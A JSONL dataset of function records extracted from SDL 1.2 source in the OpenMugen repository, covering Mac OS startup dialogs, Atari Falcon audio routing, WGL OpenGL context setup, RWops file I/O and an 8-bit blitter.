{"docstring": "//!(defined(__APPLE__) && defined(__MACH__))\n", "func_signal": "static int getCurrentAppName (StrFileName name)", "code": "{\n\t\n    ProcessSerialNumber process;\n    ProcessInfoRec      process_info;\n    FSSpec              process_fsp;\n    \n    process.highLongOfPSN = 0;\n    process.lowLongOfPSN  = kCurrentProcess;\n    process_info.processInfoLength = sizeof (process_info);\n    process_info.processName    = NULL;\n    process_info.processAppSpec = &process_fsp;\n    \n    if ( noErr != GetProcessInformation (&process, &process_info) )\n       return 0;\n    \n    SDL_memcpy(name, process_fsp.name, process_fsp.name[0] + 1);\n    return 1;\n}", "path": "src\\main\\macos\\SDL_main.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* This is where execution begins */\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n\n#if !(defined(__APPLE__) && defined(__MACH__))\n#pragma unused(argc, argv)\n#endif\n\t\n#define DEFAULT_ARGS \"\\p\"                /* pascal string for default args */\n#define DEFAULT_VIDEO_DRIVER \"\\ptoolbox\" /* pascal string for default video driver name */\t\n#define DEFAULT_OUTPUT_TO_FILE 1         /* 1 == output to file, 0 == no output */\n\n#define VIDEO_ID_DRAWSPROCKET 1          /* these correspond to popup menu choices */\n#define VIDEO_ID_TOOLBOX      2\n\n    PrefsRecord prefs = { DEFAULT_ARGS, DEFAULT_VIDEO_DRIVER, DEFAULT_OUTPUT_TO_FILE }; \n\t\n#if !(defined(__APPLE__) && defined(__MACH__))\n\tint     nargs;\n\tchar   **args;\n\tchar   *commandLine;\n\t\n\tStrFileName  appNameText;\n#endif\n\tint     videodriver     = VIDEO_ID_TOOLBOX;\n    int     settingsChanged = 0;\n    \n    long\ti;\n\n\t/* Kyle's SDL command-line dialog code ... */\n#if !TARGET_API_MAC_CARBON\n\tInitGraf    (&qd.thePort);\n\tInitFonts   ();\n\tInitWindows ();\n\tInitMenus   ();\n\tInitDialogs (nil);\n#endif\n\tInitCursor ();\n\tFlushEvents(everyEvent,0);\n#if !TARGET_API_MAC_CARBON\n\tMaxApplZone ();\n#endif\n\tMoreMasters ();\n\tMoreMasters ();\n#if 0\n\t/* Intialize SDL, and put up a dialog if we fail */\n\tif ( SDL_Init (0) < 0 ) {\n\n#define kErr_OK\t\t1\n#define kErr_Text\t2\n\n        DialogPtr errorDialog;\n        short\t  dummyType;\n    \tRect\t  dummyRect;\n\t    Handle    dummyHandle;\n\t    short     itemHit;\n\t\n\t\terrorDialog = GetNewDialog (1001, nil, (WindowPtr)-1);\n\t\tif (errorDialog == NULL)\n\t\t    return -1;\n\t\tDrawDialog (errorDialog);\n\t\t\n\t\tGetDialogItem (errorDialog, kErr_Text, &dummyType, &dummyHandle, &dummyRect);\n\t\tSetDialogItemText (dummyHandle, \"\\pError Initializing SDL\");\n\t\t\n#if TARGET_API_MAC_CARBON\n\t\tSetPort (GetDialogPort(errorDialog));\n#else\n\t\tSetPort (errorDialog);\n#endif\n\t\tdo {\n\t\t\tModalDialog (nil, &itemHit);\n\t\t} while (itemHit != kErr_OK);\n\t\t\n\t\tDisposeDialog (errorDialog);\n\t\texit (-1);\n\t}\n\tatexit(cleanup_output);\n\tatexit(SDL_Quit);\n#endif\n\n/* Set up SDL's QuickDraw environment  */\n#if !TARGET_API_MAC_CARBON\n\tSDL_InitQuickDraw(&qd);\n#endif\n\n\t if ( readPreferences (&prefs) ) {\n\t\t\n        if (SDL_memcmp(prefs.video_driver_name+1, \"DSp\", 3) == 0)\n            videodriver = 1;\n        else if (SDL_memcmp(prefs.video_driver_name+1, \"toolbox\", 7) == 0)\n            videodriver = 2;\n\t }\n\t \t\n\tif ( CommandKeyIsDown() ) {\n\n#define kCL_OK\t\t1\n#define kCL_Cancel\t2\n#define kCL_Text\t3\n#define kCL_File\t4\n#define kCL_Video   6\n       \n        DialogPtr commandDialog;\n        short\t  dummyType;\n        Rect\t  dummyRect;\n        Handle    dummyHandle;\n        short     itemHit;\n   #if TARGET_API_MAC_CARBON\n        ControlRef control;\n   #endif\n        \n        /* Assume that they will change settings, rather than do exhaustive check */\n        settingsChanged = 1;\n        \n        /* Create dialog and display it */\n        commandDialog = GetNewDialog (1000, nil, (WindowPtr)-1);\n    #if TARGET_API_MAC_CARBON\n        SetPort ( GetDialogPort(commandDialog) );\n    #else\n        SetPort (commandDialog);\n     #endif\n           \n        /* Setup controls */\n    #if TARGET_API_MAC_CARBON\n        GetDialogItemAsControl(commandDialog, kCL_File, &control);\n        SetControlValue (control, prefs.output_to_file);\n    #else\n        GetDialogItem   (commandDialog, kCL_File, &dummyType, &dummyHandle, &dummyRect); /* MJS */\n        SetControlValue ((ControlHandle)dummyHandle, prefs.output_to_file );\n    #endif\n\n        GetDialogItem     (commandDialog, kCL_Text, &dummyType, &dummyHandle, &dummyRect);\n        SetDialogItemText (dummyHandle, prefs.command_line);\n\n    #if TARGET_API_MAC_CARBON\n        GetDialogItemAsControl(commandDialog, kCL_Video, &control);\n        SetControlValue (control, videodriver);\n   #else\n        GetDialogItem   (commandDialog, kCL_Video, &dummyType, &dummyHandle, &dummyRect);\n        SetControlValue ((ControlRef)dummyHandle, videodriver);\n     #endif\n\n        SetDialogDefaultItem (commandDialog, kCL_OK);\n        SetDialogCancelItem  (commandDialog, kCL_Cancel);\n\n        do {\n        \t\t\n        \tModalDialog(nil, &itemHit); /* wait for user response */\n            \n            /* Toggle command-line output checkbox */\t\n        \tif ( itemHit == kCL_File ) {\n        #if TARGET_API_MAC_CARBON\n        \t\tGetDialogItemAsControl(commandDialog, kCL_File, &control);\n        \t\tSetControlValue (control, !GetControlValue(control));\n        #else\n        \t\tGetDialogItem(commandDialog, kCL_File, &dummyType, &dummyHandle, &dummyRect); /* MJS */\n        \t\tSetControlValue((ControlHandle)dummyHandle, !GetControlValue((ControlHandle)dummyHandle) );\n        #endif\n        \t}\n\n        } while (itemHit != kCL_OK && itemHit != kCL_Cancel);\n\n        /* Get control values, even if they did not change */\n        GetDialogItem     (commandDialog, kCL_Text, &dummyType, &dummyHandle, &dummyRect); /* MJS */\n        GetDialogItemText (dummyHandle, prefs.command_line);\n\n    #if TARGET_API_MAC_CARBON\n        GetDialogItemAsControl(commandDialog, kCL_File, &control);\n        prefs.output_to_file = GetControlValue(control);\n\t#else\n        GetDialogItem (commandDialog, kCL_File, &dummyType, &dummyHandle, &dummyRect); /* MJS */\n        prefs.output_to_file = GetControlValue ((ControlHandle)dummyHandle);\n \t#endif\n\n    #if TARGET_API_MAC_CARBON\n        GetDialogItemAsControl(commandDialog, kCL_Video, &control);\n        videodriver = GetControlValue(control);\n    #else\n        GetDialogItem (commandDialog, kCL_Video, &dummyType, &dummyHandle, &dummyRect);\n        videodriver = GetControlValue ((ControlRef)dummyHandle);\n     #endif\n\n        DisposeDialog (commandDialog);\n\n        if (itemHit == kCL_Cancel ) {\n        \texit (0);\n        }\n\t}\n    \n    /* Set pseudo-environment variables for video driver, update prefs */\n\tswitch ( videodriver ) {\n\t   case VIDEO_ID_DRAWSPROCKET: \n\t      SDL_putenv(\"SDL_VIDEODRIVER=DSp\");\n\t      SDL_memcpy(prefs.video_driver_name, \"\\pDSp\", 4);\n\t      break;\n\t   case VIDEO_ID_TOOLBOX:\n\t      SDL_putenv(\"SDL_VIDEODRIVER=toolbox\");\n\t      SDL_memcpy(prefs.video_driver_name, \"\\ptoolbox\", 8);\n\t      break;\n\t}\n\n#if !(defined(__APPLE__) && defined(__MACH__))\n    /* Redirect standard I/O to files */\n\tif ( prefs.output_to_file ) {\n\t\tfreopen (STDOUT_FILE, \"w\", stdout);\n\t\tfreopen (STDERR_FILE, \"w\", stderr);\n\t} else {\n\t\tfclose (stdout);\n\t\tfclose (stderr);\n\t}\n#endif\n   \n    if (settingsChanged) {\n        /* Save the prefs, even if they might not have changed (but probably did) */\n        if ( ! writePreferences (&prefs) )\n            fprintf (stderr, \"WARNING: Could not save preferences!\\n\");\n    }\n   \n#if !(defined(__APPLE__) && defined(__MACH__))\n    appNameText[0] = 0;\n    getCurrentAppName (appNameText); /* check for error here ? */\n\n    commandLine = (char*) malloc (appNameText[0] + prefs.command_line[0] + 2);\n    if ( commandLine == NULL ) {\n       exit(-1);\n    }\n\n    /* Rather than rewrite ParseCommandLine method, let's replace  */\n    /* any spaces in application name with underscores,            */\n    /* so that the app name is only 1 argument                     */   \n    for (i = 1; i < 1+appNameText[0]; i++)\n        if ( appNameText[i] == ' ' ) appNameText[i] = '_';\n\n    /* Copy app name & full command text to command-line C-string */      \n    SDL_memcpy(commandLine, appNameText + 1, appNameText[0]);\n    commandLine[appNameText[0]] = ' ';\n    SDL_memcpy(commandLine + appNameText[0] + 1, prefs.command_line + 1, prefs.command_line[0]);\n    commandLine[ appNameText[0] + 1 + prefs.command_line[0] ] = '\\0';\n\n    /* Parse C-string into argv and argc */\n    nargs = ParseCommandLine (commandLine, NULL);\n    args = (char **)malloc((nargs+1)*(sizeof *args));\n    if ( args == NULL ) {\n\t\texit(-1);\n\t}\n\tParseCommandLine (commandLine, args);\n        \n\t/* Run the main application code */\n\tSDL_main(nargs, args);\n\tfree (args);\n\tfree (commandLine);\n   \n   \t/* Remove useless stdout.txt and stderr.txt */\n   \tcleanup_output ();\n#else // defined(__APPLE__) && defined(__MACH__)\n\tSDL_main(argc, argv);\n#endif\n   \t\n\t/* Exit cleanly, calling atexit() functions */\n\texit (0);    \n\n\t/* Never reached, but keeps the compiler quiet */\n\treturn (0);\n}", "path": "src\\main\\macos\\SDL_main.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* See if the command key is held down at startup */\n", "func_signal": "static Boolean CommandKeyIsDown(void)", "code": "{\n\tKeyMap  theKeyMap;\n\n\tGetKeys(theKeyMap);\n\n\tif (((unsigned char *) theKeyMap)[6] & 0x80) {\n\t\treturn(true);\n\t}\n\treturn(false);\n}", "path": "src\\main\\macos\\SDL_main.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* Falcon XBIOS implementation of Devconnect() is buggy with external clock */\n", "func_signal": "static void Devconnect2(int src, int dst, int sclk, int pre)", "code": "{\t\t\n\tstatic const unsigned short MASK1[3] = { 0, 0x6000, 0 };\n\tstatic const unsigned short MASK2[4] = { 0xFFF0, 0xFF8F, 0xF0FF, 0x0FFF };\n\tstatic const unsigned short INDEX1[4] = {  1, 3, 5, 7 };\n\tstatic const unsigned short INDEX2[4] = {  0, 2, 4, 6 };\n\tunsigned short sync_div,dev_ctrl,dest_ctrl;\n\tvoid *oldstack;\n\n\tif (dst==0) {\n\t\treturn;\n\t}\n\n\toldstack=(void *)Super(0);\n\n\tdev_ctrl = DMAAUDIO_IO.dev_ctrl;\n\tdest_ctrl = DMAAUDIO_IO.dest_ctrl;\n\tdev_ctrl &= MASK2[src];\n\n\tif (src==ADC) {\n\t\tdev_ctrl |= MASK1[sclk];\n\t} else {\n\t\tdev_ctrl |= (INDEX1[sclk] << (src<<4));\n\t}\n\n\tif (dst & DMAREC) {\t\t\n\t\tdest_ctrl &= 0xFFF0;\n\t\tdest_ctrl |= INDEX1[src];\n\t}\n\n\tif (dst & DSPRECV) {\t\t\n\t\tdest_ctrl &= 0xFF8F;\n\t\tdest_ctrl |= (INDEX1[src]<<4); \n\t}\n\n\tif (dst & EXTOUT) {\t\t\n\t\tdest_ctrl &= 0xF0FF;\n\t\tdest_ctrl |= (INDEX1[src]<<8); \n\t}\n\n\tif (dst & DAC) {\t\t\n\t\tdev_ctrl &= 0x0FFF;\n\t\tdev_ctrl |= MASK1[sclk]; \n\t\tdest_ctrl &=  0x0FFF;\n\t\tdest_ctrl |= (INDEX2[src]<<12); \n\t}\n\n\tsync_div = DMAAUDIO_IO.sync_div;\n\tif (sclk==CLKEXT) {\n\t\tpre<<=8;\n\t\tsync_div &= 0xF0FF;\n\t} else {\n\t\tsync_div &= 0xFFF0;\n\t}\n\tsync_div |= pre;\n\n\tDMAAUDIO_IO.dev_ctrl = dev_ctrl;\n\tDMAAUDIO_IO.dest_ctrl = dest_ctrl;\n\tDMAAUDIO_IO.sync_div = sync_div;\n\n\tSuper(oldstack);\n}", "path": "src\\audio\\mint\\SDL_mintaudio_xbios.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* Ugh, we have to duplicate the kernel's keysym mapping code...\n   Oh, it's not so bad. :-)\n\n   FIXME: Add keyboard LED handling code\n */\n", "func_signal": "int VGL_initkeymaps(int fd)", "code": "{\n\tvga_keymap = SDL_malloc(sizeof(keymap_t));\n\tif ( ! vga_keymap ) {\n\t\tSDL_OutOfMemory();\n\t\treturn(-1);\n\t}\n\tif (ioctl(fd, GIO_KEYMAP, vga_keymap) == -1) {\n\t\tSDL_free(vga_keymap);\n\t\tvga_keymap = NULL;\n\t\tSDL_SetError(\"Unable to get keyboard map\");\n\t\treturn(-1);\n\t}\n\treturn(0);\n}", "path": "src\\video\\vgl\\SDL_vglevents.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* SDL_VIDEO_OPENGL */\n", "func_signal": "int WIN_GL_SetupWindow(_THIS)", "code": "{\n\tint retval;\n#if SDL_VIDEO_OPENGL\n\tint i;\n\tint iAttribs[64];\n\tint *iAttr;\n\tfloat fAttribs[1] = { 0 };\n\tconst GLubyte *(WINAPI *glGetStringFunc)(GLenum);\n\tconst char *wglext;\n\n\t/* load the gl driver from a default path */\n\tif ( ! this->gl_config.driver_loaded ) {\n\t\t/* no driver has been loaded, use default (ourselves) */\n\t\tif ( WIN_GL_LoadLibrary(this, NULL) < 0 ) {\n\t\t\treturn(-1);\n\t\t}\n\t}\n\n\t/* Set up the pixel format descriptor with our needed format */\n\tSDL_memset(&GL_pfd, 0, sizeof(GL_pfd));\n\tGL_pfd.nSize = sizeof(GL_pfd);\n\tGL_pfd.nVersion = 1;\n\tGL_pfd.dwFlags = (PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL);\n\tif ( this->gl_config.double_buffer ) {\n\t\tGL_pfd.dwFlags |= PFD_DOUBLEBUFFER;\n\t}\n\tif ( this->gl_config.stereo ) {\n\t\tGL_pfd.dwFlags |= PFD_STEREO;\n\t}\n\tGL_pfd.iPixelType = PFD_TYPE_RGBA;\n\tGL_pfd.cColorBits = this->gl_config.buffer_size;\n\tGL_pfd.cRedBits = this->gl_config.red_size;\n\tGL_pfd.cGreenBits = this->gl_config.green_size;\n\tGL_pfd.cBlueBits = this->gl_config.blue_size;\n\tGL_pfd.cAlphaBits = this->gl_config.alpha_size;\n\tGL_pfd.cAccumRedBits = this->gl_config.accum_red_size;\n\tGL_pfd.cAccumGreenBits = this->gl_config.accum_green_size;\n\tGL_pfd.cAccumBlueBits = this->gl_config.accum_blue_size;\n\tGL_pfd.cAccumAlphaBits = this->gl_config.accum_alpha_size;\n\tGL_pfd.cAccumBits =\n\t\t(GL_pfd.cAccumRedBits + GL_pfd.cAccumGreenBits +\n\t\t GL_pfd.cAccumBlueBits + GL_pfd.cAccumAlphaBits);\n\tGL_pfd.cDepthBits = this->gl_config.depth_size;\n\tGL_pfd.cStencilBits = this->gl_config.stencil_size;\n\n\t/* setup WGL_ARB_pixel_format attribs */\n\tiAttr = &iAttribs[0];\n\n\t*iAttr++ = WGL_DRAW_TO_WINDOW_ARB;\n\t*iAttr++ = GL_TRUE;\n\t*iAttr++ = WGL_ACCELERATION_ARB;\n\t*iAttr++ = WGL_FULL_ACCELERATION_ARB;\n\t*iAttr++ = WGL_RED_BITS_ARB;\n\t*iAttr++ = this->gl_config.red_size;\n\t*iAttr++ = WGL_GREEN_BITS_ARB;\n\t*iAttr++ = this->gl_config.green_size;\n\t*iAttr++ = WGL_BLUE_BITS_ARB;\n\t*iAttr++ = this->gl_config.blue_size;\n\t\n\tif ( this->gl_config.alpha_size ) {\n\t\t*iAttr++ = WGL_ALPHA_BITS_ARB;\n\t\t*iAttr++ = this->gl_config.alpha_size;\n\t}\n\n\t*iAttr++ = WGL_DOUBLE_BUFFER_ARB;\n\t*iAttr++ = this->gl_config.double_buffer;\n\n\t*iAttr++ = WGL_DEPTH_BITS_ARB;\n\t*iAttr++ = this->gl_config.depth_size;\n\n\tif ( this->gl_config.stencil_size ) {\n\t\t*iAttr++ = WGL_STENCIL_BITS_ARB;\n\t\t*iAttr++ = this->gl_config.stencil_size;\n\t}\n\n\tif ( this->gl_config.accum_red_size ) {\n\t\t*iAttr++ = WGL_ACCUM_RED_BITS_ARB;\n\t\t*iAttr++ = this->gl_config.accum_red_size;\n\t}\n\n\tif ( this->gl_config.accum_green_size ) {\n\t\t*iAttr++ = WGL_ACCUM_GREEN_BITS_ARB;\n\t\t*iAttr++ = this->gl_config.accum_green_size;\n\t}\n\n\tif ( this->gl_config.accum_blue_size ) {\n\t\t*iAttr++ = WGL_ACCUM_BLUE_BITS_ARB;\n\t\t*iAttr++ = this->gl_config.accum_blue_size;\n\t}\n\n\tif ( this->gl_config.accum_alpha_size ) {\n\t\t*iAttr++ = WGL_ACCUM_ALPHA_BITS_ARB;\n\t\t*iAttr++ = this->gl_config.accum_alpha_size;\n\t}\n\n\tif ( this->gl_config.stereo ) {\n\t\t*iAttr++ = WGL_STEREO_ARB;\n\t\t*iAttr++ = GL_TRUE;\n\t}\n\n\tif ( this->gl_config.multisamplebuffers ) {\n\t\t*iAttr++ = WGL_SAMPLE_BUFFERS_ARB;\n\t\t*iAttr++ = this->gl_config.multisamplebuffers;\n\t}\n\n\tif ( this->gl_config.multisamplesamples ) {\n\t\t*iAttr++ = WGL_SAMPLES_ARB;\n\t\t*iAttr++ = this->gl_config.multisamplesamples;\n\t}\n\n\tif ( this->gl_config.accelerated >= 0 ) {\n\t\t*iAttr++ = WGL_ACCELERATION_ARB;\n\t\t*iAttr++ = (this->gl_config.accelerated ? WGL_GENERIC_ACCELERATION_ARB : WGL_NO_ACCELERATION_ARB);\n\t}\n\n\t*iAttr = 0;\n\n\tfor ( i=0; ; ++i ) {\n\t\t/* Get the window device context for our OpenGL drawing */\n\t\tGL_hdc = GetDC(SDL_Window);\n\t\tif ( GL_hdc == NULL ) {\n\t\t\tSDL_SetError(\"Unable to get DC for SDL_Window\");\n\t\t\treturn(-1);\n\t\t}\n\n\t\t/* Choose and set the closest available pixel format */\n\t\tpixel_format = ChoosePixelFormatARB(this, iAttribs, fAttribs);\n\t\tif ( !pixel_format ) {\n\t\t\tpixel_format = ChoosePixelFormat(GL_hdc, &GL_pfd);\n\t\t}\n\t\tif ( !pixel_format ) {\n\t\t\tSDL_SetError(\"No matching GL pixel format available\");\n\t\t\treturn(-1);\n\t\t}\n\t\tif ( !SetPixelFormat(GL_hdc, pixel_format, &GL_pfd) ) {\n\t\t\tif ( i == 0 ) {\n\t\t\t\t/* First time through, try resetting the window */\n\t\t\t\tif ( WIN_GL_ResetWindow(this) < 0 ) {\n\t\t\t\t\treturn(-1);\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tSDL_SetError(\"Unable to set HDC pixel format\");\n\t\t\treturn(-1);\n\t\t}\n\t\t/* We either succeeded or failed by this point */\n\t\tbreak;\n\t}\n\tDescribePixelFormat(GL_hdc, pixel_format, sizeof(GL_pfd), &GL_pfd);\n\n\tGL_hrc = this->gl_data->wglCreateContext(GL_hdc);\n\tif ( GL_hrc == NULL ) {\n\t\tSDL_SetError(\"Unable to create GL context\");\n\t\treturn(-1);\n\t}\n\tif ( WIN_GL_MakeCurrent(this) < 0 ) {\n\t\treturn(-1);\n\t}\n\tgl_active = 1;\n\n\t/* Get the wglGetPixelFormatAttribivARB pointer for the context */\n\tif ( this->gl_data->WGL_ARB_pixel_format ) {\n\t\tthis->gl_data->wglGetPixelFormatAttribivARB =\n\t\t\t(BOOL (WINAPI *)(HDC, int, int, UINT, const int *, int *))\n\t\t\tthis->gl_data->wglGetProcAddress(\"wglGetPixelFormatAttribivARB\");\n\t} else {\n\t\tthis->gl_data->wglGetPixelFormatAttribivARB = NULL;\n\t}\n\n\t/* Vsync control under Windows.  Checking glGetString here is\n\t * somewhat a documented and reliable hack - it was originally\n\t * as a feature added by mistake, but since so many people rely\n\t * on it, it will not be removed.  strstr should be safe here.*/\n\tglGetStringFunc = WIN_GL_GetProcAddress(this, \"glGetString\");\n\tif ( glGetStringFunc ) {\n\t\twglext = (const char *)glGetStringFunc(GL_EXTENSIONS);\n\t} else {\n\t\t/* Uh oh, something is seriously wrong here... */\n\t\twglext = NULL;\n\t}\n\tif ( wglext && SDL_strstr(wglext, \"WGL_EXT_swap_control\") ) {\n\t\tthis->gl_data->wglSwapIntervalEXT = WIN_GL_GetProcAddress(this, \"wglSwapIntervalEXT\");\n\t\tthis->gl_data->wglGetSwapIntervalEXT = WIN_GL_GetProcAddress(this, \"wglGetSwapIntervalEXT\");\n\t} else {\n\t\tthis->gl_data->wglSwapIntervalEXT = NULL;\n\t\tthis->gl_data->wglGetSwapIntervalEXT = NULL;\n\t}\n\tif ( this->gl_config.swap_control >= 0 ) {\n\t\tif ( this->gl_data->wglSwapIntervalEXT ) {\n\t\t\tthis->gl_data->wglSwapIntervalEXT(this->gl_config.swap_control);\n\t\t}\n\t}\n#else\n\tSDL_SetError(\"WIN driver not configured with OpenGL\");\n#endif\n\tif ( gl_active ) {\n\t\tretval = 0;\n\t} else {\n\t\tretval = -1;\n\t}\n\treturn(retval);\n}", "path": "src\\video\\wincommon\\SDL_wingl.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* If setting the HDC fails, we may need to recreate the window (MSDN) */\n", "func_signal": "static int WIN_GL_ResetWindow(_THIS)", "code": "{\n\tint status = 0;\n\n#ifndef _WIN32_WCE /* FIXME WinCE needs the UNICODE version of CreateWindow() */\n\t/* This doesn't work with DirectX code (see CVS comments) */\n\t/* If we were passed a window, then we can't create a new one */\n\tif ( !SDL_windowid && SDL_strcmp(this->name, \"windib\") == 0 ) {\n\t\t/* Save the existing window attributes */\n\t\tLONG style;\n\t\tRECT rect = { 0, 0, 0, 0 };\n\t\tstyle = GetWindowLong(SDL_Window, GWL_STYLE);\n\t\tGetWindowRect(SDL_Window, &rect);\n\t\tDestroyWindow(SDL_Window);\n\t\tWIN_FlushMessageQueue();\n\n\t\tSDL_resizing = 1;\n\t\tSDL_Window = CreateWindow(SDL_Appname, SDL_Appname,\n\t\t                          style,\n\t\t                          rect.left, rect.top,\n\t\t                          (rect.right-rect.left)+1,\n\t\t                          (rect.bottom-rect.top)+1,\n\t\t                          NULL, NULL, SDL_Instance, NULL);\n\t\tWIN_FlushMessageQueue();\n\t\tSDL_resizing = 0;\n\n\t\tif ( SDL_Window ) {\n\t\t\tthis->SetCaption(this, this->wm_title, this->wm_icon);\n\t\t} else {\n\t\t\tSDL_SetError(\"Couldn't create window\");\n\t\t\tstatus = -1;\n\t\t}\n\t} else\n#endif /* !_WIN32_WCE */\n\t{\n\t\tSDL_SetError(\"Unable to reset window for OpenGL context\");\n\t\tstatus = -1;\n\t}\n\treturn(status);\n}", "path": "src\\video\\wincommon\\SDL_wingl.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* Functions to read/write stdio file pointers */\n", "func_signal": "static int SDLCALL stdio_seek(SDL_RWops *context, int offset, int whence)", "code": "{\n\tif ( fseek(context->hidden.stdio.fp, offset, whence) == 0 ) {\n\t\treturn(ftell(context->hidden.stdio.fp));\n\t} else {\n\t\tSDL_Error(SDL_EFSEEK);\n\t\treturn(-1);\n\t}\n}", "path": "src\\file\\SDL_rwops.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* Functions to blit from 8-bit surfaces to other surfaces */\n", "func_signal": "static void Blit1to1(SDL_BlitInfo *info)", "code": "{\n#ifndef USE_DUFFS_LOOP\n\tint c;\n#endif\n\tint width, height;\n\tUint8 *src, *map, *dst;\n\tint srcskip, dstskip;\n\n\t/* Set up some basic variables */\n\twidth = info->d_width;\n\theight = info->d_height;\n\tsrc = info->s_pixels;\n\tsrcskip = info->s_skip;\n\tdst = info->d_pixels;\n\tdstskip = info->d_skip;\n\tmap = info->table;\n\n\twhile ( height-- ) {\n#ifdef USE_DUFFS_LOOP\n\t\tDUFFS_LOOP(\n\t\t\t{\n\t\t\t  *dst = map[*src];\n\t\t\t}\n\t\t\tdst++;\n\t\t\tsrc++;\n\t\t, width);\n#else\n\t\tfor ( c=width; c; --c ) {\n\t\t        *dst = map[*src];\n\t\t\tdst++;\n\t\t\tsrc++;\n\t\t}\n#endif\n\t\tsrc += srcskip;\n\t\tdst += dstskip;\n\t}\n}", "path": "src\\video\\SDL_blit_1.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* HAVE_STDIO_H */\n", "func_signal": "SDL_RWops *SDL_RWFromMem(void *mem, int size)", "code": "{\n\tSDL_RWops *rwops;\n\n\trwops = SDL_AllocRW();\n\tif ( rwops != NULL ) {\n\t\trwops->seek = mem_seek;\n\t\trwops->read = mem_read;\n\t\trwops->write = mem_write;\n\t\trwops->close = mem_close;\n\t\trwops->hidden.mem.base = (Uint8 *)mem;\n\t\trwops->hidden.mem.here = rwops->hidden.mem.base;\n\t\trwops->hidden.mem.stop = rwops->hidden.mem.base+size;\n\t}\n\treturn(rwops);\n}", "path": "src\\file\\SDL_rwops.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* Make the current context active */\n", "func_signal": "int WIN_GL_MakeCurrent(_THIS)", "code": "{\n\tint retval;\n\n\tretval = 0;\n\tif ( ! this->gl_data->wglMakeCurrent(GL_hdc, GL_hrc) ) {\n\t\tSDL_SetError(\"Unable to make GL context current\");\n\t\tretval = -1;\n\t}\n\treturn(retval);\n}", "path": "src\\video\\wincommon\\SDL_wingl.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* Remove the output files if there was no output written */\n", "func_signal": "static void cleanup_output(void)", "code": "{\n\tFILE *file;\n\tint empty;\n\n\t/* Flush the output in case anything is queued */\n\tfclose(stdout);\n\tfclose(stderr);\n\n\t/* See if the files have any output in them */\n\tfile = fopen(STDOUT_FILE, \"rb\");\n\tif ( file ) {\n\t\tempty = (fgetc(file) == EOF) ? 1 : 0;\n\t\tfclose(file);\n\t\tif ( empty ) {\n\t\t\tremove(STDOUT_FILE);\n\t\t}\n\t}\n\tfile = fopen(STDERR_FILE, \"rb\");\n\tif ( file ) {\n\t\tempty = (fgetc(file) == EOF) ? 1 : 0;\n\t\tfclose(file);\n\t\tif ( empty ) {\n\t\t\tremove(STDERR_FILE);\n\t\t}\n\t}\n}", "path": "src\\main\\macos\\SDL_main.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* Passing a NULL path means load pointers from the application */\n", "func_signal": "int WIN_GL_LoadLibrary(_THIS, const char* path)", "code": "{\n\tHMODULE handle;\n\n \tif ( gl_active ) {\n \t\tSDL_SetError(\"OpenGL context already created\");\n \t\treturn -1;\n \t}\n\n\tif ( path == NULL ) {\n\t\tpath = DEFAULT_GL_DRIVER_PATH;\n\t}\n\thandle = LoadLibrary(path);\n\tif ( handle == NULL ) {\n\t\tSDL_SetError(\"Could not load OpenGL library\");\n\t\treturn -1;\n\t}\n\n\t/* Unload the old driver and reset the pointers */\n\tWIN_GL_UnloadLibrary(this);\n\n\t/* Load new function pointers */\n\tSDL_memset(this->gl_data, 0, sizeof(*this->gl_data));\n\tthis->gl_data->wglGetProcAddress = (void * (WINAPI *)(const char *))\n\t\tGetProcAddress(handle, \"wglGetProcAddress\");\n\tthis->gl_data->wglCreateContext = (HGLRC (WINAPI *)(HDC))\n\t\tGetProcAddress(handle, \"wglCreateContext\");\n\tthis->gl_data->wglDeleteContext = (BOOL (WINAPI *)(HGLRC))\n\t\tGetProcAddress(handle, \"wglDeleteContext\");\n\tthis->gl_data->wglMakeCurrent = (BOOL (WINAPI *)(HDC, HGLRC))\n\t\tGetProcAddress(handle, \"wglMakeCurrent\");\n\tthis->gl_data->wglSwapIntervalEXT = (void (WINAPI *)(int))\n\t\tGetProcAddress(handle, \"wglSwapIntervalEXT\");\n\tthis->gl_data->wglGetSwapIntervalEXT = (int (WINAPI *)(void))\n\t\tGetProcAddress(handle, \"wglGetSwapIntervalEXT\");\n\n\tif ( (this->gl_data->wglGetProcAddress == NULL) ||\n\t     (this->gl_data->wglCreateContext == NULL) ||\n\t     (this->gl_data->wglDeleteContext == NULL) ||\n\t     (this->gl_data->wglMakeCurrent == NULL) ) {\n\t\tSDL_SetError(\"Could not retrieve OpenGL functions\");\n\t\tFreeLibrary(handle);\n\t\treturn -1;\n\t}\n\n\tthis->gl_config.dll_handle = handle;\n\tSDL_strlcpy(this->gl_config.driver_path, path, SDL_arraysize(this->gl_config.driver_path));\n\tthis->gl_config.driver_loaded = 1;\n\treturn 0;\n}", "path": "src\\video\\wincommon\\SDL_wingl.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
